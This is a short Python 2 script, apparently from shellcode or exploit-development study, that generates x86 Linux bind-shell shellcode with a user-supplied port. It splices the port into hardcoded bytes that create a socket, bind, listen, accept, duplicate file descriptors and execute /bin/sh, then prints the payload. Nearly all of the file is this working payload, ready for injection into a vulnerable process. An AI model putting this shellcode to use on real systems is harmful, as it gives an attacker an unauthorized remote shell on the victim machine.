#!/bin/python

# Author  : Alessio Parzian
# Filename: ShellGen.py

# This script is an helper to easily configure the port of the bind shell

import sys

try:
	port = "{:04x}".format(int(sys.argv[1]))
	port_hex = port
	port = "\\x"+port[:2]+"\\x"+port[2:]

	shellcode = ("\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\x66\\xb8\\x67\\x01"
			     "\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc6\\x66\\xb8\\x69\\x01\\x89\\xf3\\x52\\x66"
			     "\\x68"+port+"\\x66\\x6a\\x02\\x89\\xe1\\x31\\xd2\\x83\\xc2\\x10\\xcd\\x80\\x66"
			     "\\xb8\\x6b\\x01\\x89\\xf3\\x31\\xc9\\xcd\\x80\\x66\\xb8\\x6c\\x01\\x89\\xf3\\x31"
			     "\\xd2\\x52\\x52\\x89\\xe1\\x6a\\x02\\x89\\xe2\\x31\\xf6\\xcd\\x80\\x89\\xc3\\x31"
			     "\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\xfe\\xc9\\xcd\\x80\\x75\\xf6\\x31\\xc0\\x50"
			     "\\xb0\\x0b\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x31\\xff"
			     "\\x57\\x89\\xe2\\x53\\x89\\xe1\\xcd\\x80");
	
	print "[*] Shellcode will listen at port {}, which in hex is {}".format(sys.argv[1], port_hex)
	print "[*] Size: {0} bytes".format(shellcode.count("x"))
	print
	print "[*] Spawing..."
	print
	print shellcode
	
except Exception, e:
	print str(e)
	print 'Please specify port number as parameter in decimal format.\\n'
	print 'Usage:'
	print '	python ShellGen.py $port_number'
	exit(-1)